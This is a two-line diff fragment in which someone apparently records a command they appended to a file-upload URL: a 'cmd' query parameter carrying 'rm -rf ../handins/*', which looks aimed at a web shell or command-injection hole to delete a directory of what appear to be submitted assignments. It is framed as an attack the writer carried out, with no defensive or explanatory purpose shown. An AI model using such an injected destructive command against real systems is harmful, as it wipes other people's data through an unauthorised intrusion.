@@ -1,0 +1,2 @@
+Commands I added to the address of the file upload:
+?cmd=rm+-rf+../handins/*
